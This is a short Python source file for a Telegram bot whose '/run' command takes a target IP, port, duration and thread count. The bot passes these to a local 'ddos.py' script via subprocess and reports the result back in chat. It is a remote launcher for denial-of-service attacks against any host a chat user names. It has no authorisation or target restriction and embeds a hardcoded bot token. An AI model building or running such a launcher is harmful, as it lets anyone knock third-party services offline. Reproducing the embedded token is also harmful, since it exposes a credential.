from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import subprocess

BOT_TOKEN = "8683061091:AAE6A0wTsPud71upSp8QkB0bVAwcMQp_e6E"

# 👉 start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot ready babu 👍\nUse:\n/run <IP> <PORT> <TIME> <THREADS>")

# 👉 run command
async def run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args

    # ❗ check input
    if len(args) != 4:
        await update.message.reply_text("Usage:\n/run <IP> <PORT> <TIME> <THREADS>")
        return

    ip, port, duration, threads = args

    await update.message.reply_text(f"Running on {ip}:{port} ...")

    try:
        # 👇 script run (arguments ke saath)
        result = subprocess.run(
            ["python", "ddos.py", ip, port, duration, threads],
            capture_output=True,
            text=True
        )

        # 👉 output bhej do Telegram pe
        output = result.stdout if result.stdout else "Done (no output)"

        await update.message.reply_text(f"Finished ✅\n\n{output[:3000]}")

    except Exception as e:
        await update.message.reply_text(f"Error ❌\n{str(e)}")


# 👉 bot start
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("run", run))

print("Bot running...")
app.run_polling()
